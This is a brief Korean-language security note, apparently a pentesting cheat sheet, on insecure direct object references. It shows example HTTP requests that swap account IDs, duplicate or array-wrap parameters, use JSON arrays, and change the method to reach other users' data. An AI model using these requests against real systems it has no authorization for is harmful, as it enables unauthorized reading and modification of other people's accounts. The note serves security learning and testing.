# Concept
- insecure direct object references
- Access Control에서 발생하는 취약점 중 외부에 노출되거나 제공되는 입력이 Object에 직접 참고하고 엑세스할 때 이를 이용하여 본인의 권한을 넘어서는 액션을 수행
- 쉬운 예로 파라미터 조작해서 다른 id의 정보를 알아낼 수 있는 경우

# Exploit
- Origin Request
```
GET /info?accountId=15442
```

- IDOR Request
```
GET /info?accountId=1110
```



- Origin Request
```
POST /save_profile HTTP/1.1

account=15442&name=aaa
```

- IDOR Request
```
POST /save_profile HTTP/1.1

account=1110&name=aaa
```

- HPP를 통해 우회하는 경우도 있음
```
POST /save_profile HTTP/1.1

account=15442&account=1110&name=aaa
```

```
POST /save_profile HTTP/1.1

account[]=15442&account[]=1110&name=aaa
```

- JSON Array 이용
- Origin Request
```
POST /save_profile HTTP/1.1

{
    "account":"15442"
}
```

- Origin Request
```
POST /save_profile HTTP/1.1

{
    "account":[
        "15442",
        "1110"
    ]
}  
```

- Change Method
```
PUT /save_profile HTTP/1.1

account=1110&name=aaa
```